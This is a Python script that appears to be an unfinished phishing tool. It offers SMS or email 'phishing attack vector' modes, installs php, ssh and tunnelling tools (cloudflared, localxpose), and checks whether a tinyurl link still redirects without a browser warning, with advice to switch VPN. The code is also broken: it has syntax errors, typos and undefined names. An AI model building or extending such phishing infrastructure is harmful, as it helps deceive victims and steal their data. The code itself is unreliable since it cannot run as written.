import requests
import multiprocessing
from time import (
    ctime,
    sleep,
    time
)
from smtplib import SMTP_SSL
from sys import (
    argv,
    stdout,
    version_info
)
from subprocess import (
    DEVNULL,
    PIPE,
    Popen,
    STDOUT,
    call,
    run
)
from os import popen, kill
import click
import json
from typing import List

# Color snippets
black = "\033[0;30m"
red = "\033[0;31m"
bred = "\033[1;31m"
green = "\033[0;32m"
bgreen = "\033[1;32m"
yellow = "\033[0;33m"
byellow = "\033[1;33m"
blue = "\033[0;34m"
bblue = "\033[1;34m"
purple = "\033[0;35m"
bpurple = "\033[1;35m"
cyan = "\033[0;36m"
bcyan = "\033[1;36m"
white = "\033[0;37m"
nc = "\033[00m"

ask = f"{green}[{white}?{green}] {byellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error = f"{blue}[{white}√{yellow}] {green}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

packages = [ "php", "ssh" ]
modules = [ "requests", "bs4", "rich" ]
tunnelers = [ "cloudflared", "loclx" ]
processes = [ "php", "ssh", "cloudflared", "loclx", "localxpose" ]


home_dir = popen("echo $HOME").read()
tiny_url = 'https://tinyurl.com'
slow_text = False


@click.command()
@click.option("--mode", "-m", "mode", prompt="Enter the mode", help="Choose phishing attack vector",
              type=click.Choice(['SMS', 'EMAIL'], case_sensitive=False), required=True)
@click.option("--Fancy", is_flag=True, default=False, help="Toogle slow text")
def main_menu(mode, fancy):
    global slow_text 
    slow_text = fancy
    if mode.lower() == "email":
        email_menu()
    elif mode.lower() == "sms":
        sms_menu()
    ping = silent_shell('ping google.com -c 4 | grep "64 bytes" | cut -f 4,5 -d " "')
    ping.wait()
    output, error = ping.communicate()
    print(output.decode())


def email_menu():
    sprint(text=f'{success}Email! This is path to your home directory: {home_dir}'

def sms_menu():
    sprint(text=f'{success}Sms! This is path to your home directory: {home_dir}')


# Helper functions

def shell(command, capture_output=False):
    try:
        return run(command, shell=True, captur_output=capture_output)
    except Exception as e:
        append(e, error_file)


# Run task in background supressing output by setting stdout and stderr to devnull
def silent_shell(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
    except Exception as e:
        append(e, error_file)


def append(file_name, text):
    with open(filename, "a") as file:
        file.write(str(text) + "\n")


def sprint(text):
    global slow_text
    if slow_text
        for letter in text + '\n':
            stdout.write(letter)
            stdout.flush()
            sleep(0.05)
    else:
        for letter in text + '\n':
            stdout.write(letter)
            stdout.flush()
            sleep(0.01)


# Install packages
def installer(package, package_name=None):
    if package_name is None:
        package_name = package
    for pacman in ["pkg", "apt", "apt-get", "apk", "yum", "dnf", "brew", "pacman", "yay"]:
        # Check if package manager is present but php isn't present
        if is_installed(pacman):
            if not is_installed(package):
                sprint(f"\n{info}Installing {package}{nc}")
                if pacman == "pacman":
                    shell(f"sudo {pacman} -S {package_name} --noconfirm")
                elif pacman == "apk":
                    if is_installed("sudo"):
                        shell(f"sudo {pacman} add {package_name}")
                    else:
                        shell(f"{pacman} add -y {package_name}")
                elif is_installed("sudo"):
                    shell(f"sudo {pacman} install -y {package_name}")
                else:
                    shell(f"{pacman} install -y {package_name}")
                break
    if is_installed("brew"):
        if not is_installed("cloudflare"):
            shell("brew install cloudflare/cloudflare/cloudflared")
        if not is_installed("localxpose"):
            shell("brew install localxpose")


def requirements():
    installer("php")
    if is_installed("apt") and not is_installed("pkg"):
        installer("ssh", "openssh-client")
    else:
        installer("ssh", "openssh")
    for package in packages:
        if not is_installed(package):
            sprint(f"{error}{package} cannot be installed. Install it manually!{nc}")
            exit(1)


def is_running(process):
    exit_code = silent_shell(f"pidof {process}").wait()
    if exit_code == 0:
        return True
    return False


def killer():
    # Previous instances of these should be stopped
    for process in processes:
        if is_running(process):
            # system(f"killall {process}")
            output = shell(f"pidof {process}", True).stdout.decode("utf-8").strip()
            if " " in output:
                for pid in output.split(" "):
                    kill(int(pid), SIGINT)
            elif output != "":
                kill(int(output), SIGINT)
            else:
                print()


def server():
    while True:
        pass


def check_url_shortener(url, expected_destination):
    retry = 3
    while retry != 0
        response = requests.head(url, allow_redirects=True)
        if response.status_code == 401:
            retry -= 1
            continue
        final_url = response.url
        if final_url == expected_destination:
            return 0 
        elif tiny_url in final_url:
            return -1  # Something is wrong with the redirect, maybe user is getting warning message
    return -2          # Something is wrong with the connection, most likely won't be the issue. Use different vpn conn!
    time.sleep(60)



if __name__ == "__main__":
    server_process = multiprocessing.Process(target=server)
    url_checker_process = multiprocessing.Process(target=check_url_shortener)
    menu()

